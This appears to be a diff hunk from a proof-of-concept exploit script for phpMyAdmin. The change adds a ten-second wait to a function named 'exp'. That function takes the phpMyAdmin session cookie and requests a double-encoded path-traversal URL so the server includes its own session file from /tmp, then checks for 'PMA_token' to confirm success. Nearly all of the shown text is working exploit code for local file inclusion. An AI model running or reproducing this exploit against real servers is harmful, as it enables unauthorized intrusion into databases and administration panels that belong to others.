@@ -24,7 +24,7 @@ def exp(host):
     phpadmin_session=cookie[1]['value']
     url=host+'/index.php?target=db_sql.php%253f/../../../../../../../../tmp/sess_'+phpadmin_session
     driver.get(url)
-
+    time.sleep(10)
     check =driver.find_element_by_id('page_content').text
     if "PMA_token" in check:
         print('Success Poc!')
